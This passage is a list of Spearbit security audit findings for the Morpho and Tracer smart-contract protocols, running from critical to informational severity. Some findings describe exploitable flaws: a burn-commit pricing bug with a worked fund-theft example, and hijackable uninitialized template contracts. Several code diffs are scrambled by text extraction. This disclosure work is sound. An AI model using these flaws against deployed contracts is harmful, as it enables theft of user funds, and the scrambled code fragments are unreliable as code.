be added to the tail of the list. This is something that Morpho would like to avoid because it would decrease protocol performance when it needs to match/unmatch suppliers/borrowers.  In the case where a list is long enough, a very high value would make the tranaction revert each time one of those function directly or indirectly call insertSorted. The gas rail guard present in the match/unmatch supplier/borrow is useless because the loop would be called at least one time.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Initial SwapManager cumulative prices values are wrong", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values. (reserve0, reserve1, blockTimestampLast) = pair.getReserves(); price0CumulativeLast = reserve1 / reserve0; price1CumulativeLast = reserve0 / reserve1; One of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real currentCumulativePrices in update, the TWAP will be a large, wrong value. The slippage checks will not work correctly.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. Therefore withdrawals could fail.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Inside the _withdraw function, all changes performed to supplyBalanceInOf are done using the _supplier address. The _receiver is correctly used only to transfer the underlying token via underlyingToken.safeTransfer(_- receiver, _amount); The Withdrawn event should be emitted passing the supplyBalanceInOf[_poolTokenAddress] of the supplier and not the receiver. This problem will arise when this internal function is called by PositionsManagerForAave.liquidate where sup- plier (borrower in this case) and receiver (liquidator) would not be the same address.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "_repayERC20ToPool is approving the wrong amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_repayERC20ToPool is approving the amount of underlying token specified via the input parameter _amount when the correct amount that should be approved is the one calculated via: _amount = Math.min( _amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) );", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates is looping enteredMar- kets which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:  In the future Aave could have more assets and Morpho could match 1:1 those assets.  Block gas size could decrease.  Opcodes could cost more gas.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Missing parameter validation on setters and event spamming prevention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "User parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring. contracts/aave/RewardsManagerForAave.sol 20 function setAaveIncentivesController(address _aaveIncentivesController) external override onlyOwner { + + } require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); contracts/aave/MarketsManagerForAave.sol function setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner { reserveFactor[_marketAddress] = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; updateRates(_marketAddress); emit ReserveFactorSet(_marketAddress, reserveFactor[_marketAddress]); require(_marketAddress != address(0), \"param != address(0)\"); uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; if( finalReserveFactor !== reserveFactor[_marketAddress] ) { reserveFactor[_marketAddress] = finalReserveFactor; emit ReserveFactorSet(_marketAddress, finalReserveFactor); } updateRates(_marketAddress); - - - - - - - + + + + + + + + + + + } function setNoP2P(address _marketAddress, bool _noP2P) external onlyOwner isMarketCreated(_marketAddress) { + } require(_noP2P != noP2P[_marketAddress], \"param != prevValue\"); noP2P[_marketAddress] = _noP2P; emit NoP2PSet(_marketAddress, _noP2P); function updateP2PExchangeRates(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateP2PExchangeRates(_marketAddress); + { } 21 function updateSPYs(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateSPYs(_marketAddress); + { } contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol function setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner { require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); + + } Important note: _newNDS min/max value should be accurately validated by the team because this will influence the maximum number of cycles that DDL.insertSorted can do. Setting a value too high would make the transaction fail while setting it too low would make the insertSorted loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33 function setNDS(uint8 _newNDS) external onlyOwner { // add a check on `_newNDS` validating correctly max/min value of `_newNDS` require(NDS != _newNDS, \"param != prevValue\"); NDS = _newNDS; emit NDSSet(_newNDS); + + } Important note: _newNDS set to 0 would skip all theMatchingEngineForAave match/unmatch supplier/borrower functions if the user does not specify a custom maxGas A more detailed issue about NDS value can be found here: #34 function setMaxGas(MaxGas memory _maxGas) external onlyOwner { // add a check on `_maxGas` validating correctly max/min value of `_maxGas` // add a check on `_maxGas` internal value checking that at least one of them is different compared to the old version maxGas = _maxGas; emit MaxGasSet(_maxGas); + + ,! } function setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner { require(_newTreasuryVaultAddress != address(0), \"param != address(0)\"); require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\"); treasuryVault = _newTreasuryVaultAddress; emit TreasuryVaultSet(_newTreasuryVaultAddress); + + } function setRewardsManager(address _rewardsManagerAddress) external onlyOwner { require(_rewardsManagerAddress != address(0), \"param != address(0)\"); require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\"); rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress); emit RewardsManagerSet(_rewardsManagerAddress); + + } Important note: Should also check that _poolTokenAddress is currently handled by the PositionsManagerForAave and by the MarketsManagerForAave. Without this check a poolToken could start in a paused state. 22 + function setPauseStatus(address _poolTokenAddress) external onlyOwner { require(_poolTokenAddress != address(0), \"param != address(0)\"); bool newPauseStatus = !paused[_poolTokenAddress]; paused[_poolTokenAddress] = newPauseStatus; emit PauseStatusSet(_poolTokenAddress, newPauseStatus); }", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "DDL should prevent inserting items with 0 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently the DDL library is only checking that the actual value (_list.accounts[_id].value) in the list associated with the _id is 0 to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than 0. This check would prevent adding users with empty values, which may potentially cause the list and as a result the overall protocol to underperform.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted iterates more than max iterations parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function iterates _maxIterations + 1 times instead of _maxIterations times.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted does not behave like a FIFO for same values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Users that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users order and should behave more like a FIFO queue.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted inserts elements at wrong index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function inserts elements after the last element has been insterted, when these should have actually been insterted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail. if ( ... && current != _list.tail) { insertBefore } else { insertAtEnd } Example:  list = [20]. insert(40) then current == list.tail, and is inserted at the back instead of the front. result = [20, 40]  list = [30, 10], insert(20) insertion point should be before current == 10, but also current == tail therfore the current != _list.tail condition is false and the element is wrongly inserted at the end. result = [30, 10, 20]", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "PositionsManagerForAaveLogic gas optimization suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Update the remainingTo variable only when needed. Inside each function, the remainingTo counter could be moved inside the if statement to avoid calculation when the amount that should be subtracted is >0.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "MarketsManagerForAave._updateSPYs could store calculations in local variables to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The calculation in the actual code must be updated following this issue: #36. This current issue is an example on how to avoid an additional SLOAD. The function could store locally currentReserveFactor, newSupplyP2PSPY and newBorrowP2PSPY to avoid addi- tional SLOAD", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Declare variable as immutable/constant and remove unused variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some state variable can be declared as immutable or constant to save gas. Constant variables should be names in uppercase + snake case following the official Solidity style guide. Additionally, variables which are never used across the protocol code can be removed to save gas during deployment and improve readability. RewardsManagerForAave.sol -ILendingPoolAddressesProvider public addressesProvider; -ILendingPool public lendingPool; +ILendingPool public immutable lendingPool; -IPositionsManagerForAave public positionsManager; +IPositionsManagerForAave public immutable positionsManager; SwapManagerUniV2.sol -IUniswapV2Router02 public swapRouter = IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter ,! +IUniswapV2Router02 public constant SWAP_ROUTER = ,! IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter -IUniswapV2Pair public pair; +IUniswapV2Pair public immutable pair; SwapManagerUniV3.sol 27 -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -address public WETH9; // Intermediate token address. +address public immutable WETH9; // Intermediate token address. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -bool public singlePath; +bool public boolean singlePath; SwapManagerUniV3OnEth.sol -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -IUniswapV3Pool public pool2; +IUniswapV3Pool public immutable pool2;", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Function does not revert if balance to transfer is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently when the claimToTreasury() function is called it gets the amountToClaim by using un- derlyingToken.balanceOf(address(this). It then uses this amountToClaim in the safeTransfer() function and the ReserveFeeClaimed event is emitted. The problem is that the function does not take into account that it is possible for the amountToClaim to be 0. In this case the safeTransfer function would still be called and the ReserveFeeClaimed event would still be emitted unnecessarily.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "matchingEngine should be initialized in PositionsManagerForAaveLogics initialize function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave inherits from PositionsManagerForAaveStorage which is an UUPSUp- gradeable contract. Following UUPS best practices, should also be initialized. the MatchingEngineForAave deployed by PositionsManagerForAaveLogic", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Misc: notation, style guide, global unit types, etc", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Follow solidity notation, standard style guide and global unit types to improve readability.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Outdated or wrong Natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some Natspec documentation is missing parameters/return value or is not correctly updated to reflect the function code.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Use the official UniswapV3 0.8 branch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The current repository creates local copies of the UniswapV3 codebase and manually migrates the contracts to Solidity 0.8.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Unused events and unindexed event parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Certain parameters should be defined as indexed to track them from web3 applications / security monitoring tools.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Rewards are ignored in the on-pool rate computation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho claims that the protocol is a strict improvement upon the underlying lending protocols. It tries to match as many suppliers and borrowers P2P at the supply/borrow mid-rate of the underlying protocol. However, given high reward incentives paid out to on-pool users it could be the case that being on the pool yields a better rate than the P2P rate.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Pool token price is incorrect when there is more than one pending upkeep", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X. However, in the current implementation price includes the current total supply but burn commits burn pool tokens immediately when commit() is called, not when upkeep() is executed. // pool token price computation at execution of updateIntervalId, example for long price priceHistory[updateIntervalId].longPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount + _totalCommit[updateIntervalId].longBurnShortMintAmount) ,! The implementation tries to fix this by adding back all tokens burned at this updateIntervalId but it must also add back all tokens that were burned in future commits (i.e. when ID > updateIntervalID). This issue allows an attacker to get a better pool token price and steal pool token funds. Example: Given the preconditions:  long.totalSupply() = 2000  User owns 1000 long pool tokens  lastPriceTimestamp = 100  updateInterval = 10  frontRunningInterval = 5 At time 104: User commits to BurnLong 500 tokens in appropriateUpdateIntervalId = 5. Upon execution user receives a long price of longBalance / (1500 + 500) if no further future commitments are made. Then, as tokens are burned totalPoolCommitments[5].longBurnAmount = 500 and long.totalSupply -= 500. time 106: At 6 as they are now past totalPoolCommitments[6].longBurnAmount = 500, long.totalSupply -= 500 again as tokens are burned. User commits another 500 tokens to BurnLong at appropriateUpdateIntervalId = Now the frontRunningInterval and are scheduled for the next update. the 5th update interval Finally, (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCom- mit[5].longBurnShortMintAmount = longBalance / (1000 + 500) which is a better price than what the user should have received. ID is executed by the pool keeper but at longPrice = longBalance / With a longBalance of 2000, the user receives 500 * (2000 / 1500) = 666.67 tokens executing the first burn commit and 500 * ((2000 - 666.67) / 1500) = 444.43 tokens executing the second one. 5 The total pool balance received by the user is 1111.1/2000 = 55.555% by burning only 1000 / 2000 = 50% of the pool token supply.", "labels": ["Spearbit", "Tracer", "Severity: Critical"]}, {"title": "No price scaling in SMAOracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The update() function of the SMAOracle contract doesnt scale the latestPrice although a scaler is set in the constructor. On the other hand, the _latestRoundData() function of ChainlinkOracleWrapper contract does scale via toWad(). contract SMAOracle is IOracleWrapper { constructor(..., uint256 _spotDecimals, ...) { ... require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); ... /* `scaler` is always <= 10^18 and >= 1 so this cast is safe */ scaler = int256(10**(MAX_DECIMALS - _spotDecimals)); ... } function update() internal returns (int256) { /* query the underlying spot price oracle */ IOracleWrapper spotOracle = IOracleWrapper(oracle); int256 latestPrice = spotOracle.getPrice(); ... priceObserver.add(latestPrice); // doesn't scale latestPrice ... } contract ChainlinkOracleWrapper is IOracleWrapper { function getPrice() external view override returns (int256) { (int256 _price, ) = _latestRoundData(); return _price; } function _latestRoundData() internal view returns (int256, uint80) { (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData(); ... return (toWad(price), ...); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Two different invariantCheck variables used in PoolFactory.deployPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function in the PoolFactory contract uses two different invariantCheck vari- ables: the one defined as a contracts instance variable and the one supplied as a parameter. Note: This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\". function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... poolCommitter.initialize(..., ,! invariantCheck deploymentParameters.invariantCheck, ... ); // version 1 of ... ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({ ... _invariantCheckContract: invariantCheck, // version 2 of invariantCheck ... });", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Duplicate user payments for long commits when paid from balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Initial executionPrice is too high", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When a pool is deployed the initial executionPrice is calculated as firstPrice * 1e18 where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice(): contract PoolKeeper is IPoolKeeper, Ownable { function newPool(address _poolAddress) external override onlyFactory { int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice(); int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), ,! FIXED_POINT)); executionPrice[_poolAddress] = startingPrice; } } All other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling: function performUpkeepSinglePool() { ... (int256 latestPrice, ...) = pool.getUpkeepInformation(); ... executionPrice[_pool] = latestPrice; ... } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function getUpkeepInformation() { (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata(); return (_latestPrice, ...); } } The price after the firstPrice will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Paused state cant be set and therefore withdrawQuote() cant be executed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The checkInvariants() function of the InvariantCheck contract is called via the modifiers check- InvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommit- ter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The aforementioned modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheck- Contract modifier. Thus the paused variable will never be set to true, making withdrawQuote() impossible to be executed because it requires the contract to be paused. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked. Relevant parts of the code: The checkInvariants() function calls InvariantCheck.pause() if the invariants dont hold. The latter calls pause() in LeveragedPool and PoolCommitter: contract InvariantCheck is IInvariantCheck { function checkInvariants(address poolToCheck) external override { ... pause(IPausable(poolToCheck), IPausable(address(poolCommitter))); ... } function pause(IPausable pool, IPausable poolCommitter) internal { pool.pause(); poolCommitter.pause(); } } In LeveragedPool and PoolCommitter contracts, the checkInvariantsBeforeFunction() and checkIn- variantsAfterFunction() modifiers will make the transaction revert if checkInvariants() sets the paused state. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external override onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); } ,! } 9 contract PoolCommitter is IPoolCommitter, Initializable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The performUpkeepSinglePool() function of the PoolKeeper contract updates executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, pool.poolUpkeep() can revert, for example due to the checkInvariantsBeforeFunction modifier in mintTokens(). If pool.poolUpkeep() reverts then the previous price value is lost and the processing will not be accurate. There- fore, it is safer to store the new price only if pool.poolUpkeep() has been executed succesfully. function performUpkeepSinglePool(...) public override { ... int256 lastExecutionPrice = executionPrice[_pool]; executionPrice[_pool] = latestPrice; ... try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) { // previous price can get lost if poolUpkeep() reverts ... // executionPrice[_pool] should be updated here } catch Error(string memory reason) { ... } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Pools can be deployed with malicious or incorrect quote tokens and oracles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployment of a pool via deployPool() is permissionless. The deployer provides several pa- rameters that have to be trusted by the users of a specific pool, these parameters include:  oracleWrapper  settlementEthOracle  quoteToken  invariantCheck If any one of them is malicious, then the pool and its value will be affected. Note: Separate findings are made for the deployer check (issue Authenticity check for oracles is not effective) and the invariantCheck (issue Two different invariantCheck variables used in PoolFactory.deployPool() ).", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "pairTokenBase and poolBase template contracts instances are not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The constructor of PoolFactory contract creates three template contract instances but only one is initialized: poolCommitterBase. The other two contract instances (pairTokenBase and poolBase) are not initial- ized. contract PoolFactory is IPoolFactory, Ownable { constructor(address _feeReceiver) { ... PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized pairTokenBaseAddress = address(pairTokenBase); LeveragedPool poolBase = new LeveragedPool(); // not initialized poolBaseAddress = address(poolBase); PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized poolCommitterBaseAddress = address(poolCommitterBase); ... /* initialise base PoolCommitter template (with dummy values) */ poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0); } This means an attacker can initialize the templates setting them as the owner, and perform owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens. In PoolToken.initialize() an attacker can become the owner by calling initialize() with an address under his control as a parameter. The same can happen in LeveragedPool.initialize() with the initialization parameter. 13 contract PoolToken is ERC20_Cloneable, IPoolToken { ... } contract ERC20_Cloneable is ERC20, Initializable { function initialize(address _pool, ) external initializer { // not called for the template contract owner = _pool; ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! // not called for the template contract ... // set the owner of the pool. This is governance when deployed from the factory governance = initialization._owner; } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Oracles are not updated before use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "getPendingCommits() underreports commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When frontRunningInterval > updateInterval, the PoolCommitter.getAppropriateUpdateIntervalId() function can return updateInterval IDs that are arbitrarily far into the future, especially if appropriateIntervalId > updateIntervalId + 1. Therefore, commits can also be made to these appropriate interval IDs far in the future by calling commit(). The PoolCommitter.getPendingCommits() function only checks the commits for updateIntervalId and updateIn- tervalId + 1, but needs to check up to updateIntervalId + factorDifference + 1. Currently, it is underreporting the pending commits which leads to the checkInvariants function not checking the correct values.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Authenticity check for oracles is not effective", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. As the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. Note: this check does protect against frontrunning the deployment transaction of the same pool. See Undocu- mented frontrunning protection. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\");", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect calculation of keeper reward", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The keeper reward is calculated as (keeperGas * tipPercent / 100) / 1e18. The division by 1e18 is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. This in turn will call executeCommitments() repeatedly. For each call to executeCommitments() the updateMintingFee() function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling executeCommitments() with boundedIntervals == true and numberOfIntervals == 0. Note: Also see issue It is not possible to call executeCommitments() for multiple old commits. It is also important that lastPriceTimestamp is only updated after the last executeCommitments(), otherwise it will revert. 17 function executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override ,! onlyPool { ... uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max; ... while (i < upperBound) { if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) { // ,! lastPriceTimestamp shouldn't be updated too soon ... } } ... updateMintingFee(); // should do this once (in combination with _boundedIntervals==true) ... }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "It is not possible to call executeCommitments() for multiple old commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. In this context the following problem occurs:  In the first run of poolUpkeep(), lastPriceTimestamp will be set to block.timestamp.  In the next run of poolUpkeep(), processing will stop at require(intervalPassed(),..), because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId, which is updated in executeCommitments(), will start lagging. 18 function poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override ,! onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); // next time lastPriceTimestamp == ,! block.timestamp executePriceChange(_oldPrice, _newPrice); // should only to this once (in combination with ,! _boundedIntervals==true) 